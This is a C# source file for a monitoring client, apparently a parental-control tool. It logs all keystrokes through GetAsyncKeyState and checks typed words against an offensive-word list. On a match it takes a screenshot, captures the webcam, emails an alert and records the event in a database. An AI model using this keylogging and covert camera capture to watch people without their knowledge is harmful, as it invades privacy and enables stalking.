using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace ClientSide
{
    class MonitorTyping : Monitor
    {
        int threadID = 0;
        string input = "";
        public bool ifLive;
        public MonitorTyping() { }
        public override void playThreadMonitor()
        {
            base.monitorAlive = true;
            base.monitorThread = new Thread(playTypingMonitor);
            threadID = base.monitorThread.ManagedThreadId;
            base.monitorThread.Start();

        }
        public override void stopThreadMonitor()
        {

            base.monitorAlive = false;
            Thread.Sleep(1000);
            if (base.monitorThread != null)
            {
                base.monitorThread.Abort(); // abo sara eli  
            }
           
        }

        // keylogger from API
        [DllImport("User32.dll")]
        public static extern int GetAsyncKeyState(Int32 i);
    

        public void playTypingMonitor()
        {
            Setting setting = Setting.Instance;
            List<string> offensiveWords = setting.getWord();
            input = "";
           
            while (base.monitorAlive)
            {
                Thread.Sleep(5);
                for (int i = 32; i < 127; i++) 
                {
                    int keyState = GetAsyncKeyState(i);
                    if (keyState == 32769) //Is the button of this asci value pressed
                    {
                        input += (char)i;

                        if (i == 32) // if type space 
                        {
                            string replacement = input.Replace(" ", "").ToLower();
                            input = "";

                            if (ifLive)
                            {
                                wordFromKeylogger handler = Program.updateCurrentKeylogger;
                                handler(replacement);
                            }
                             
                           
                            foreach (string badWord in offensiveWords)
                            {

                                string xb = badWord.Replace(" ", "");
                                if (replacement.ToLower().Equals(badWord) && xb.Length > 0)
                                {
                                    reportOrSendAlert(badWord);
                                    break; 
                                }   
                            }
                            
                        }


                    }
                }
            }
            ShowErrorDialog("monitor typing stop");
        }
        
       

        private void reportOrSendAlert(string badWord)
        {
            if (base.SettingInstance.triggersForAlert.Contains("badWord") == true)//If the follower has set to report 
                //from a trigger of typing an inappropriate word  
            {
                string FilePic = ScreenCapture();
                CaptureCamera(FilePic);
                sendAlertToMail(FilePic, "badWord trigger occur", badWord, "typing");
                ShowErrorDialog("send alert to mail\nTypedin trigger occur\nword: |" + badWord + "|");

            } 

            if (base.SettingInstance.triggersForReport.Contains("badWord") == true)
            {
                base.DBInstance.connectToDatabase();
                base.DBInstance.fillTriggersTable(1, DateTime.Now.ToString(), "\"" + badWord + "\"");
                ShowErrorDialog("update DB\nTypedin trigger occur\nword: |" + badWord + "|");
            }
        } 

       
        private static void ShowErrorDialog(string message)
        {
            Console.WriteLine(message);
           
        }
    }
}
 
